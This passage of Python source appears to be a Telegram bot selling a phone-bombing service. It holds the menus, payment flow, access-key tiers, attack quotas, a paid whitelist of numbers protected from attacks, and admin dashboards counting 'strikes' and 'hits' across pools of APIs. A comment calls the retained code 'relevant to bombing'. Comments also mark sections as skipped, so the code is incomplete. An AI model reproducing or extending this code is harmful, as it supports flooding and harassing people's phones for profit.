                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='nav_back')]]))

        elif data == 'wl_view':
            cursor.execute("SELECT entry, type, label FROM whitelist WHERE added_by=?", (uid,))
            rows = cursor.fetchall()
            if not rows: return await q.message.reply_text("📋 Koi entry nahi hai.", reply_markup=shield_kb())
            txt = f"╔══ 📋 PROTECTED ENTRIES ══╗\n{L1}\n"
            for e, etype, lbl in rows:
                icon = "📱" if etype=='number' else "💳"
                txt += f"{icon} <code>{e}</code>" + (f" ({lbl})" if lbl else "") + "\n"
            txt += f"╚{'═'*27}╝"
            await q.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=shield_kb())

        elif data in ['wl_add_num','wl_add_upi']:
            if uid != ADMIN_ID:
                return await q.message.reply_text(
                    f"╔══ 🔒 ADMIN ONLY ══╗\n{L1}\n"
                    f"Whitelist entries sirf Admin add kar sakta hai!\n"
                    f"Contact: {ADMIN_USERNAME}\n╚{'═'*27}╝",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='nav_back')]]))
            if data == 'wl_add_num':
                await q.message.reply_text("📱 10-digit number bhejein (Admin whitelist):", reply_markup=cancel_kb())
                ctx.user_data['state'] = 'WAIT_WL_NUM'
            else:
                await q.message.reply_text("💳 UPI ID bhejein (Admin whitelist):", reply_markup=cancel_kb())
                ctx.user_data['state'] = 'WAIT_WL_UPI'

        elif data == 'wl_remove':
            if uid != ADMIN_ID:
                return await q.message.reply_text(
                    f"🔒 Sirf Admin remove kar sakta hai!\nContact: {ADMIN_USERNAME}",
                    parse_mode=ParseMode.HTML)
            cursor.execute("SELECT entry, type FROM whitelist")
            rows = cursor.fetchall()
            if not rows: return await q.message.reply_text("📋 Koi entry nahi hai.")
            txt = "🗑️ <b>Remove Entry (Admin)</b>\nJo entry hatani hai wo type karo:\n\n"
            for e, t in rows:
                txt += f"{'📱' if t=='number' else '💳'} <code>{e}</code>\n"
            await q.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            ctx.user_data['state'] = 'WAIT_WL_REMOVE'

        # PROFILE
        elif data == 'nav_profile':
            cursor.execute(
                "SELECT id,username,first_name,tier,expiry,total_sent,total_attacks,joined_at,last_seen FROM users WHERE id=?",
                (uid,))
            u = cursor.fetchone()
            if not u: return await q.message.reply_text("❌ /start karein.")
            uid_,un,fn,tier_,exp_,hits,attacks,joined,last = u
            if exp_ and exp_ != '0':
                try:
                    dt = datetime.strptime(exp_,'%Y-%m-%d %H:%M:%S')
                    rem = dt - now_ist()
                    if rem.total_seconds() > 0:
                        d = rem.days; hh = rem.seconds//3600; mm = (rem.seconds%3600)//60
                        exp_txt = f"✅ {dt.strftime('%d %b %Y')}\n   ⏳ {d}d {hh}h {mm}m baki"
                    else: exp_txt = "❌ Expired"
                except: exp_txt = "N/A"
            else: exp_txt = "♾️ Free Tier"
            lim   = get_atk_per_day(uid, tier_)
            rnds  = get_rounds(uid, tier_)
            rem_a = daily_left(uid, tier_)
            cursor.execute("SELECT COUNT(*) FROM whitelist WHERE added_by=?", (uid,))
            wl_cnt = cursor.fetchone()[0]
            max_wl = TIER_DATA.get(tier_,{}).get('max_wl',0) if uid != ADMIN_ID else 999
            t_banner = TIER_BANNERS.get(tier_, L1)
            t_glow   = TIER_GLOWS.get(tier_, '○ ○ ○ ○ ○')
            hit_bar   = get_bar(min(hits, 100000), 100000, 14)
            atk_bar   = get_bar(min(attacks, 1000), 1000, 14)
            pct_today = int(rem_a / max(lim, 1) * 100)
            today_bar = "🟩" * int(pct_today/7) + "⬛" * (14 - int(pct_today/7))
            spd       = TIER_DATA.get(tier_,{}).get('speed', 2.0)
            blx_ok    = TIER_DATA.get(tier_,{}).get('blx_access', False)
            await q.message.reply_text(
                f"╔══ 🤖 AI WAR PROFILE CARD ══╗\n"
                f"{t_banner}\n"
                f"👤 <b>{fn or un or 'Agent'}</b>  @{un or 'N/A'}\n"
                f"🆔 <code>{uid_}</code>\n"
                f"⚡ <b>Power:</b>  {t_glow}\n"
                f"{t_banner}\n"
                f"{tc(tier_)} <b>Rank:</b>     {tb(tier_)}\n"
                f"📅 <b>Expiry:</b>\n   {exp_txt}\n"
                f"{t_banner}\n"
                f"━━ 💥 COMBAT STATS ━━\n"
                f"💥 Hits:     <code>{fmt_num(hits)}</code>\n"
                f"<code>[{hit_bar}]</code>\n"
                f"⚔️  Attacks: <code>{fmt_num(attacks)}</code>\n"
                f"<code>[{atk_bar}]</code>\n"
                f"📆 Today:   <code>{rem_a}/{lim}</code>\n"
                f"<code>[{today_bar}] {pct_today}%</code>\n"
                f"📦 Rounds:  <code>{fmt_num(rnds)}/strike</code>\n"
                f"🚀 Speed:   <code>{spd}s interval</code>\n"
                f"{t_banner}\n"
                f"━━ ⚡ FEATURES ━━\n"
                f"🔥 BLX POST:  {'✅ Enabled' if blx_ok or uid==ADMIN_ID else '🔒 Bronze+'}\n"
                f"🛡️ Shield:    <code>{wl_cnt}/{max_wl}</code> slots\n"
                f"{t_banner}\n"
                f"📅 Joined:   <code>{joined[:10] if joined else 'N/A'}</code>\n"
                f"🕐 Last Seen: <code>{last[:16] if last else 'N/A'}</code>\n"
                f"╚{'═'*32}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Main Menu", callback_data='nav_back')]]))

        # ENTER KEY
        elif data == 'nav_enter_key':
            await q.message.reply_text(
                f"╔══ 🔑 ENTER ACCESS KEY ══╗\n{L1}\n"
                f"📌 <b>Command:</b> <code>/key YOUR_KEY_CODE</code>\n\n"
                f"💡 <b>Example:</b>\n"
                f"<code>/key AGS-XXXX-XXXX-XXXX</code>\n"
                f"{L1}\n"
                f"💳 Key nahi hai? /buy se kharido!\n"
                f"Admin: {ADMIN_USERNAME}\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("💳 BUY KEY", callback_data='nav_buy'),
                    InlineKeyboardButton("🔙 Back", callback_data='nav_back')]]))

        # KEY STATUS
        elif data == 'nav_key_status':
            sess = get_key_session(uid)
            if uid == ADMIN_ID:
                return await q.answer("👑 Admin — unlimited access!", show_alert=True)
            if not sess:
                return await q.message.reply_text(
                    f"╔══ 🔑 KEY STATUS ══╗\n{L1}\n"
                    f"❌ Koi active key nahi hai!\n"
                    f"💳 /buy se key kharido.\n╚{'═'*27}╝",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("💳 BUY KEY", callback_data='nav_buy'),
                        InlineKeyboardButton("🔑 ENTER KEY", callback_data='nav_enter_key')]]))
            t_banner = TIER_BANNERS.get(sess['tier'], L1)
            t_glow   = TIER_GLOWS.get(sess['tier'], '○ ○ ○ ○ ○')
            time_left = key_time_remaining(sess['expires_at'])
            atk_bar_f = int(min(sess['total_used'], sess['max_attacks'] if sess['max_attacks'] > 0 else 100) / max(sess['max_attacks'] if sess['max_attacks'] > 0 else 100, 1) * 14)
            atk_bar   = "▰" * atk_bar_f + "▱" * (14 - atk_bar_f)
            await q.message.reply_text(
                f"╔══ 🔑 KEY SESSION CARD ══╗\n"
                f"{t_banner}\n"
                f"💎 <b>Tier:</b>    {tb(sess['tier'])}\n"
                f"⚡ <b>Power:</b>   {t_glow}\n"
                f"{t_banner}\n"
                f"⏱️ <b>Time Left:</b>  <code>{time_left}</code>\n"
                f"📅 <b>Expires:</b>    <code>{sess['expires_at']}</code>\n"
                f"{t_banner}\n"
                f"⚔️  <b>Total Attacks:</b>  <code>{sess['total_used']}</code> / <code>{('∞' if sess['max_attacks']==-1 else sess['max_attacks'])}</code>\n"
                f"<code>[{atk_bar}]</code>\n"
                f"📅 <b>Today's Attacks:</b> <code>{sess['daily_used']}</code> / <code>{('∞' if sess['daily_limit']==-1 else sess['daily_limit'])}</code>\n"
                f"🔀 <b>Concurrent Max:</b>  <code>{sess['max_concurrent']}</code>\n"
                f"{t_banner}\n"
                f"🗝️ <b>Key:</b> <code>{sess['key_code']}</code>\n"
                f"╚{'═'*30}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("💳 Buy New Key", callback_data='nav_buy'),
                    InlineKeyboardButton("🔙 Main Menu",   callback_data='nav_back')]]))

        # BUY KEY / VIP
        elif data == 'nav_buy':
            upi = gs('upi_id'); un = gs('upi_name')
            upi_link = f"upi://pay?pa={upi}&pn={un.replace(' ','%20')}&cu=INR"
            await q.message.reply_text(
                f"╔══════════════════════════════════╗\n"
                f"║  💎  A G S   N E X U S   K E Y  ║\n"
                f"║      A C C E S S   S T O R E     ║\n"
                f"╚══════════════════════════════════╝\n"
                f"{L3}\n"
                f"🔑 <b>Key kharidne ka process:</b>\n\n"
                f"  1️⃣  Neeche se plan select karo\n"
                f"  2️⃣  UPI se payment karo\n"
                f"  3️⃣  UTR + Screenshot admin ko do\n"
                f"  4️⃣  Admin verify karega → Key milega\n"
                f"  5️⃣  <code>/key YOUR_KEY</code> type karo\n\n"
                f"{L1}\n"
                f"💳 <b>UPI ID:</b>   <code>{upi}</code>\n"
                f"🏷️ <b>Name:</b>    {un}\n"
                f"{L1}\n"
                f"📌 <i>Plan select karo neeche 👇</i>\n"
                f"╚{'═'*31}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"💸 PAY DIRECTLY (UPI) 🚀", url=upi_link)],
                    [InlineKeyboardButton(f"⚡ MICRO/FLASH — ₹20+",  callback_data='buy_cat_micro'),
                     InlineKeyboardButton(f"💸 LOW — ₹9+",           callback_data='buy_cat_low')],
                    [InlineKeyboardButton(f"⚡ MID — ₹50+",           callback_data='buy_cat_mid'),
                     InlineKeyboardButton(f"💎 HIGH — ₹350+",         callback_data='buy_cat_high')],
                    [InlineKeyboardButton("🔙 Back", callback_data='nav_back')],
                ]))

        elif data == 'buy_cat_low':
            await q.message.reply_text(
                f"💸 <b>LOW RANGE PLANS</b>\n{L1}\n"
                f"₹9 se ₹49 — Trial & Bronze packs\nPlan select karo 👇",
                parse_mode=ParseMode.HTML, reply_markup=buy_kb('low'))

        elif data == 'buy_cat_micro':
            await q.message.reply_text(
                f"⚡ <b>MICRO / FLASH PLANS</b>\n{L1}\n"
                f"₹20 se ₹49 — Quick Flash packs\nPlan select karo 👇",
                parse_mode=ParseMode.HTML, reply_markup=buy_kb('micro'))

        elif data == 'buy_cat_mid':
            await q.message.reply_text(
                f"⚡ <b>MID RANGE PLANS</b>\n{L1}\n"
                f"₹50 se ₹299 — Silver & Gold packs\nPlan select karo 👇",
                parse_mode=ParseMode.HTML, reply_markup=buy_kb('mid'))

        elif data == 'buy_cat_high':
            await q.message.reply_text(
                f"💎 <b>HIGH RANGE PLANS</b>\n{L1}\n"
                f"₹350+ — Premium & Elite packs\nPlan select karo 👇",
                parse_mode=ParseMode.HTML, reply_markup=buy_kb('high'))

        elif data.startswith('copy_upi_'):
            upi_val = data.replace('copy_upi_', '')
            await q.answer(f"💳 UPI ID: {upi_val}\n\nCopy karke UPI app mein paste karo!", show_alert=True)

        elif data.startswith('buy_') and data not in ['buy_cat_low','buy_cat_mid','buy_cat_high']:
            plan_key = data.replace('buy_','')
            all_p = get_plans()
            if plan_key not in all_p: return await q.answer("Invalid plan!", show_alert=True)
            info = all_p[plan_key]
            tier_k = info.get('tier', plan_key)
            upi  = gs('upi_id'); upi_name = gs('upi_name')
            orig_price = info['price']
            final_price = orig_price
            if info.get('hours', 0) > 0:
                dur_txt = f"{info['hours']} Hour{'s' if info['hours']>1 else ''}"
            elif info['days'] > 1000:
                dur_txt = "Lifetime ♾️"
            else:
                dur_txt = f"{info['days']} Day{'s' if info['days']>1 else ''}"

            ctx.user_data['state']      = 'WAIT_PAYMENT_UTR'
            ctx.user_data['buy_plan']   = plan_key
            ctx.user_data['buy_amount'] = final_price

            upi_link = f"upi://pay?pa={upi}&pn={upi_name.replace(' ','%20')}&am={final_price}&cu=INR&tn=AGS_KEY_{plan_key.upper()}"
            gpay_link    = f"tez://upi/pay?pa={upi}&pn={upi_name.replace(' ','%20')}&am={final_price}&cu=INR&tn=AGS_KEY"
            phonepe_link = f"phonepe://pay?pa={upi}&pn={upi_name.replace(' ','%20')}&am={final_price}&cu=INR&tn=AGS_KEY"
            paytm_link   = f"paytmmp://pay?pa={upi}&pn={upi_name.replace(' ','%20')}&am={final_price}&cu=INR&tn=AGS_KEY"

            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"💸 PAY ₹{final_price} — ANY UPI APP 🚀", url=upi_link)],
                [InlineKeyboardButton("📱 Google Pay",  url=gpay_link),
                 InlineKeyboardButton("💜 PhonePe",     url=phonepe_link)],
                [InlineKeyboardButton("💙 Paytm",       url=paytm_link),
                 InlineKeyboardButton("💳 Copy UPI ID", callback_data=f'copy_upi_{upi}')],
                [InlineKeyboardButton("❌ Cancel", callback_data='nav_back')],
            ])
            await q.message.reply_text(
                f"╔══════════════════════════════════╗\n"
                f"║  💳  P A Y M E N T   P A G E   ║\n"
                f"╚══════════════════════════════════╝\n"
                f"{L1}\n"
                f"📦 <b>Plan:</b>    {info['label']}\n"
                f"📅 <b>Period:</b>  {dur_txt}\n"
                f"💎 <b>Tier:</b>    {tb(tier_k)}\n"
                f"{L1}\n"
                f"💰 <b>Amount:</b>  ₹<b>{final_price}</b>\n"
                f"💳 <b>UPI:</b>     <code>{upi}</code>\n"
                f"🏷️ <b>Name:</b>    {upi_name}\n"
                f"{L1}\n"
                f"╔══ ✅ PAYMENT STEPS ══╗\n"
                f"║  1️⃣  Neeche button dabao\n"
                f"║  2️⃣  UPI app open hoga\n"
                f"║  3️⃣  ₹{final_price} auto-fill hoga\n"
                f"║  4️⃣  Pay karo\n"
                f"║  5️⃣  UTR number yahan bhejo\n"
                f"║     + Screenshot bhi bhejo\n"
                f"║  6️⃣  Admin verify → Key milega!\n"
                f"╚══════════════════════╝\n"
                f"{L1}\n"
                f"📝 Pay ke baad <b>UTR/Transaction ID</b> type karo:\n"
                f"<i>(6-12 digit number — UPI app mein milega)</i>\n"
                f"╚{'═'*31}╝",
                parse_mode=ParseMode.HTML, reply_markup=kb)

        # API HEALTH (Admin only)
        elif data == 'nav_api_health':
            if uid != ADMIN_ID:
                return await q.answer("Admin only!", show_alert=True)

            cursor.execute("SELECT name, url FROM apis WHERE active=1")
            all_apis = cursor.fetchall()
            if not all_apis:
                return await q.message.reply_text("❌ Koi active API nahi hai!")

            wait_msg = await q.message.reply_text(
                f"╔══ 🌐 API HEALTH CHECK ══╗\n{L1}\n"
                f"⏳ Pinging {len(all_apis)} nodes...\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML)

            results_map = {}
            connector   = aiohttp.TCPConnector(limit=0, ssl=False)
            attempt     = 0

            async with aiohttp.ClientSession(connector=connector) as sess:
                tasks   = [ping_api(sess, url, name) for name, url in all_apis]
                initial = await asyncio.gather(*tasks, return_exceptions=True)
                for r in initial:
                    if isinstance(r, tuple):
                        results_map[r[0]] = r

                while True:
                    dead_list = [(n, u) for n, u in all_apis
                                 if results_map.get(n, ('', False, -1))[1] is False]
                    if len(dead_list) <= 2:
                        break
                    attempt  += 1
                    delay     = min(0.5 * attempt, 5.0)
                    alive_now = len(all_apis) - len(dead_list)
                    pct       = int(alive_now / len(all_apis) * 100)
                    bar       = "🟩" * int(pct / 7) + "⬛" * (14 - int(pct / 7))
                    try:
                        await wait_msg.edit_text(
                            f"╔══ 🔄 RETRY ROUND {attempt} ══╗\n{L1}\n"
                            f"🟢 Alive: <b>{alive_now}</b>  🔴 Dead: <b>{len(dead_list)}</b>\n"
                            f"<code>[{bar}] {pct}%</code>\n"
                            f"🔁 Retrying {len(dead_list)} dead nodes...\n"
                            f"⏱️ {delay:.1f}s wait\n╚{'═'*27}╝",
                            parse_mode=ParseMode.HTML)
                    except: pass
                    await asyncio.sleep(delay)
                    retry_tasks = [ping_api(sess, url, name) for name, url in dead_list]
                    retry_res   = await asyncio.gather(*retry_tasks, return_exceptions=True)
                    for r in retry_res:
                        if isinstance(r, tuple):
                            results_map[r[0]] = r

            txt = f"╔══ 🌐 API HEALTH REPORT ══╗\n{L1}\n"
            if attempt > 0:
                txt += f"🔁 Retried: <b>{attempt}</b> rounds\n{L1}\n"
            alive = dead = 0
            for name, ok, lat in results_map.values():
                icon    = "🟢" if ok else "🔴"
                lat_txt = f"{lat}ms" if lat >= 0 else "timeout"
                txt    += f"{icon} <b>{name}</b> — <code>{lat_txt}</code>\n"
                if ok: alive += 1
                else:  dead  += 1
            pct = int(alive / max(alive + dead, 1) * 100)
            bar = "🟩" * int(pct / 7) + "⬛" * (14 - int(pct / 7))
            txt += (
                f"{L1}\n"
                f"<code>[{bar}] {pct}%</code>\n"
                f"🟢 Alive: <code>{alive}</code>  🔴 Dead: <code>{dead}</code>\n"
                f"{'✅ All healthy!' if dead <= 2 else f'⚠️ {dead} APIs still down'}\n"
                f"╚{'═'*27}╝"
            )
            await wait_msg.edit_text(txt, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔄 Re-check", callback_data='nav_api_health'),
                    InlineKeyboardButton("🔙 Back",     callback_data='nav_admin')]]))

        # SUPPORT
        elif data == 'nav_support':
            await q.message.reply_text(
                f"╔══ 🆘 LIVE SUPPORT ══╗\n{L1}\n"
                f"Apni problem type karo.\nAdmin ko message jayega.\n{L1}\n💬 Message bhejo:",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            ctx.user_data['state'] = 'WAIT_SUPPORT'

        # ── ADMIN: KEY MANAGEMENT ─────────────────────
        elif data == 'adm_genkey_help' and uid == ADMIN_ID:
            await q.message.reply_text(
                f"╔══ 🔑 KEY GENERATOR HELP ══╗\n{L1}\n"
                f"<b>Command:</b>\n"
                f"<code>/genkey TIER MINS [MAX_ATK] [DAILY] [CONCURRENT] [MAX_USES] [NOTE]</code>\n\n"
                f"<b>Examples:</b>\n"
                f"<code>/genkey bronze 60</code>  — 1h bronze\n"
                f"<code>/genkey gold 1440 100 20 2 1</code>  — 1day gold\n"
                f"<code>/genkey elite 1</code>  — 1min test\n"
                f"<code>/genkey silver 30 50 10 1 5 reseller</code>  — 5 uses\n\n"
                f"<b>-1</b> = unlimited\n"
                f"{L1}\n"
                f"<code>/genbulkkey 10 bronze 60</code> — 10 keys at once\n"
                f"<code>/keylist</code> — list all keys\n"
                f"<code>/delkey AGS-XXXX-XXXX-XXXX</code>\n"
                f"<code>/keystatus UID</code>\n"
                f"<code>/revokekey UID</code>\n"
                f"╚{'═'*27}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data='nav_admin')]]))

        elif data == 'adm_keylist' and uid == ADMIN_ID:
            cursor.execute("SELECT key_code,tier,duration_mins,max_attacks,daily_attacks,max_concurrent,max_uses,used_count,note FROM access_keys ORDER BY id DESC LIMIT 20")
            rows = cursor.fetchall()
            if not rows: return await q.message.reply_text("❌ Koi key nahi hai. /genkey se banao.")
            txt = f"╔══ 🔑 ALL KEYS ══╗\n{L1}\n"
            for kc, tk, dur, ma, da, mc, mu, uc, note in rows:
                status = "✅" if uc < mu else "🔴"
                dur_txt = f"{dur//60}h" if dur >= 60 else f"{dur}m"
                txt += f"{status} <code>{kc}</code>\n   {tb(tk)} | {dur_txt} | {uc}/{mu}\n"
                if note: txt += f"   📝 {note}\n"
            txt += f"\n╚{'═'*27}╝"
            await q.message.reply_text(txt, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data='nav_admin')]]))

        elif data == 'adm_delkey' and uid == ADMIN_ID:
            await q.message.reply_text(
                f"🗑️ <b>Delete Key</b>\n{L1}\nKey code bhejo ya command use karo:\n<code>/delkey AGS-XXXX-XXXX-XXXX</code>",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            ctx.user_data['state'] = 'WAIT_ADM_DELKEY'

        elif data == 'adm_keystatus' and uid == ADMIN_ID:
            await q.message.reply_text(
                f"📊 <b>Key Status</b>\n{L1}\nUser UID bhejo:\n<code>/keystatus UID</code>",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            ctx.user_data['state'] = 'WAIT_ADM_KEYSTATUS'

        elif data == 'adm_revokekey' and uid == ADMIN_ID:
            await q.message.reply_text(
                f"🚫 <b>Revoke Key</b>\n{L1}\nUser UID bhejo (session hatane ke liye):",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
            ctx.user_data['state'] = 'WAIT_ADM_REVOKEKEY'

        elif data == 'adm_bulkkey' and uid == ADMIN_ID:
            await q.message.reply_text(
                f"📦 <b>Bulk Key Generator</b>\n{L1}\n"
                f"<code>/genbulkkey COUNT TIER MINS [MAX_ATK] [DAILY] [CONCURRENT]</code>\n\n"
                f"Example:\n<code>/genbulkkey 5 bronze 60</code>  — 5 bronze 1h keys\n"
                f"<code>/genbulkkey 10 silver 1440 50 10 1</code>",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb())

        # ADMIN PANEL
        elif data == 'nav_admin' and uid == ADMIN_ID:
            try: await q.message.delete()
            except: pass
            cursor.execute("SELECT COUNT(*) FROM users"); tu=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE tier NOT IN ('free','trial','banned')"); vu=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE banned=1"); bu=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM payments WHERE status='pending'"); pp=cursor.fetchone()[0]
            cursor.execute("SELECT SUM(total_sent) FROM users"); th=cursor.fetchone()[0] or 0
            cursor.execute("SELECT COUNT(*) FROM apis WHERE active=1"); ac=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM blx_apis WHERE active=1"); blxc=cursor.fetchone()[0]
            cursor.execute("SELECT SUM(amount) FROM payments WHERE status='approved'"); rev=cursor.fetchone()[0] or 0
            ram=get_ram(); stor=get_stor()
            ram_pct = int(ram/RAM_MB*100)
            stor_pct = int(stor/STOR_MB*100)
            ram_bar  = "🟩"*int(ram_pct/7) + "⬛"*(14-int(ram_pct/7))
            stor_bar = "🟦"*int(stor_pct/7) + "⬛"*(14-int(stor_pct/7))
            now_s = now_ist().strftime('%d %b %Y • %H:%M IST')
            live_icon = "🔴 LIVE" if active_tasks else "🟢 IDLE"
            await safe_send_photo(ctx.bot,
                chat_id=uid,
                caption=(
                    f"╔══════════════════════════════════╗\n"
                    f"║  🤖  AGS AI NEXUS ADMIN CORE  🤖 ║\n"
                    f"║  ◈ {BOT_VERSION} ◈         ║\n"
                    f"╚══════════════════════════════════╝\n"
                    f"{L3}\n"
                    f"🕐 <b>{now_s}</b>  {live_icon}\n"
                    f"{L1}\n"
                    f"━━ 👥 USERS ━━\n"
                    f"Total: <code>{fmt_num(tu)}</code>  VIP: <code>{fmt_num(vu)}</code>  Banned: <code>{bu}</code>\n"
                    f"━━ ⚡ LIVE COMBAT ━━\n"
                    f"Attacks: <code>{len(active_tasks)}</code>\n"
                    f"━━ 💰 FINANCE ━━\n"
                    f"Revenue: <code>₹{fmt_num(rev)}</code>  Pending: <code>{pp}</code>\n"
                    f"━━ 📡 APIs ━━\n"
                    f"GET: <code>{ac}</code>  BLX POST: <code>{blxc}</code>\n"
                    f"💥 Total Hits: <code>{fmt_num(th)}</code>\n"
                    f"{L1}\n"
                    f"🧠 RAM:  <code>[{ram_bar}] {ram:.1f}/{RAM_MB}MB {ram_pct}%</code>\n"
                    f"💾 DB:   <code>[{stor_bar}] {stor:.2f}/{STOR_MB}MB {stor_pct}%</code>\n"
                    f"╚{'═'*34}╝"
                ),
                reply_markup=admin_kb(), parse_mode=ParseMode.HTML)

        elif data == 'adm_stats' and uid == ADMIN_ID:
            counts = {}
            for t in ['free','trial','bronze','silver','gold','premium','elite']:
                cursor.execute("SELECT COUNT(*) FROM users WHERE tier=?", (t,))
                counts[t] = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE banned=1"); bu=cursor.fetchone()[0]
            cursor.execute("SELECT SUM(total_sent) FROM users"); th=cursor.fetchone()[0] or 0
            cursor.execute("SELECT SUM(total_attacks) FROM users"); ta=cursor.fetchone()[0] or 0
            cursor.execute("SELECT COUNT(*) FROM apis WHERE active=1"); ac=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM blx_apis WHERE active=1"); blxc=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM attack_logs"); lc=cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM payments WHERE status='pending'"); pc=cursor.fetchone()[0]
            cursor.execute("SELECT SUM(amount) FROM payments WHERE status='approved'"); rev=cursor.fetchone()[0] or 0
            cursor.execute("SELECT COUNT(*) FROM users WHERE joined_at >= ?",
                           ((now_ist()-timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S'),))
            new_today = cursor.fetchone()[0]
            total_u = sum(counts.values()) + bu
            vip_u = sum(counts[t] for t in ['bronze','silver','gold','premium','elite','trial'])
            ram = get_ram(); stor = get_stor()
            now_s = now_ist().strftime('%d %b %Y, %H:%M IST')
            all_p = get_plans()
            tier_rows = [
                ('👑 Elite',   counts['elite']),
                ('💎 Premium', counts['premium']),
                ('🥇 Gold',    counts['gold']),
                ('🥈 Silver',  counts['silver']),
                ('🥉 Bronze',  counts['bronze']),
                ('⚡ Trial',   counts['trial']),
                ('🆓 Free',    counts['free']),
            ]
            max_cnt = max(v for _, v in tier_rows) or 1
            tier_chart = ""
            for name, cnt in tier_rows:
                bar_w = int(cnt / max_cnt * 10)
                bar = "█" * bar_w + "░" * (10 - bar_w)
                tier_chart += f"  {name}: <code>[{bar}] {cnt}</code>\n"

            await q.message.reply_text(
                f"╔══ 📊 AI NEXUS LIVE DASHBOARD ══╗\n"
                f"{L3}\n"
                f"🕐 <b>{now_s}</b>\n"
                f"{L1}\n"
                f"━━ 👥 USER MATRIX ━━\n"
                f"{tier_chart}"
                f"  🚫 Banned: <code>{bu}</code>\n"
                f"  📊 Total: <code>{total_u}</code>  VIP: <code>{vip_u}</code>\n"
                f"  🆕 New Today: <code>{new_today}</code>\n"
                f"{L1}\n"
                f"━━ ⚡ LIVE WAR STATUS ━━\n"
                f"🔴 Active Strikes:  <code>{len(active_tasks)}</code>\n"
                f"💰 Pay Queue:       <code>{pc}</code>\n"
                f"📡 GET APIs:        <code>{ac}</code>  🔥 BLX POST: <code>{blxc}</code>\n"
                f"{L1}\n"
                f"━━ 💥 COMBAT STATS ━━\n"
                f"Total Hits:        <code>{fmt_num(th)}</code>\n"
                f"Total Attacks:     <code>{fmt_num(ta)}</code>\n"
                f"Log Entries:       <code>{fmt_num(lc)}</code>\n"
                f"{L1}\n"
                f"━━ 💰 BUSINESS ━━\n"
                f"Revenue:           <code>₹{fmt_num(rev)}</code>\n"
                f"Active Plans:      <code>{len(all_p)}</code>\n"
                f"{L1}\n"
                f"━━ 🖥️ SERVER ━━\n"
                f"🧠 RAM: <code>{ram:.1f}/{RAM_MB}MB ({int(ram/RAM_MB*100)}%)</code>\n"
                f"💾 DB:  <code>{stor:.2f}/{STOR_MB}MB ({int(stor/STOR_MB*100)}%)</code>\n"
                f"╚{'═'*30}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📈 Graph",    callback_data='adm_stats_graph'),
                     InlineKeyboardButton("💹 Revenue",  callback_data='adm_revenue'),
                     InlineKeyboardButton("📊 Users",    callback_data='adm_user_report')],
                    [InlineKeyboardButton("🔄 Refresh",  callback_data='adm_stats'),
                     InlineKeyboardButton("🔙 Admin",    callback_data='nav_admin')]]))

        # (other admin callbacks – keep as before, but only those relevant to bombing, keys, APIs)
        # For brevity, I'll skip pasting all the admin callback sections (they are long but unchanged except removal of tool/upi-flood parts).
        # The full code will be provided in the final file.

        # ... (remaining admin callbacks like adm_payments, adm_give, etc. are kept as they are) ...

    except Exception as e:
        logging.error(f"Callback [{data}] error: {e}")

# ══════════════════════════════════════════════════════════════
#                    TEXT HANDLER
# ══════════════════════════════════════════════════════════════
async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    text  = update.message.text.strip()
    state = ctx.user_data.get('state')
    if not state: return
    tier, banned = await verify_tier(uid, ctx)
    if banned == 1: return

    try:
        if state == 'WAIT_SUPPORT':
            ctx.user_data['state'] = None
            pri = "🔴 <b>VIP TICKET</b>" if is_vip(tier) else "🔵 <b>STANDARD TICKET</b>"
            await ctx.bot.send_message(ADMIN_ID,
                f"╔══ {pri} ══╗\n{L1}\n"
                f"👤 @{update.effective_user.username or 'N/A'}\n"
                f"🆔 <code>{uid}</code> | {tb(tier)}\n\n"
                f"💬 <b>Message:</b>\n{text}\n{L1}\n"
                f"Reply: <code>/reply {uid} message</code>",
                parse_mode=ParseMode.HTML)
            await update.message.reply_text("✅ <b>Ticket submitted!</b>\nAdmin reply karega.", parse_mode=ParseMode.HTML)

        # WHITELIST
        elif state == 'WAIT_WL_NUM':
            if not text.isdigit() or len(text) != 10:
                return await update.message.reply_text("❌ 10-digit number bhejein:")
            ctx.user_data['state'] = None
            cursor.execute("INSERT OR REPLACE INTO whitelist (entry,type,added_by,added_at) VALUES (?,'number',?,?)",
                           (text, uid, now_ist().strftime('%Y-%m-%d %H:%M:%S')))
            db.commit()
